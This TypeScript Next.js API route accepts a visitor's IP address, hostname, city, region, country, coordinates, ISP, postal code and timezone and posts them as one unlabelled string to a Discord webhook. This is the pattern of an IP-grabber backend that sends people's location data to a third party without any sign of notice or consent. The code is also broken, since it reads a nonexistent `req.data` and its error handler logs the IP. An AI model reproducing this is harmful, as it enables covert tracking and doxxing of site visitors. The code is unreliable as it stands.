// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'

type Data = {
  ip?: string,
  hostname?: string,
  city?: string,
  region?: string,
  country?: string,
  loc?: string,
  org?: string,
  postal?: string,
  timezone?: string,
  message?: string,
  name?: string
}

const webhook: string = process.env.DISCORD_WEBHOOK

export default async function handler(
  req: NextApiRequest, 
  res: NextApiResponse<Data>
) {
  if (req.method !== 'POST') {
    return res.status(405).send({ message: 'Only POST requests allowed!' })
  }

  const ip: string = req.data.ip
  const hostname: string = req.data.hostname
  const city: string = req.data.city
  const region: string = req.data.region
  const country: string = req.data.country
  const loc: string = req.data.loc
  const org: string = req.data.org
  const postal: string = req.data.postal
  const timezone: string = req.data.timezone
  
  await fetch(webhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: ip + hostname + city + region + country + loc + org + postal + timezone })
  })
    .catch(error => console.error('IP:', ip))
  return res.status(204).end()
}
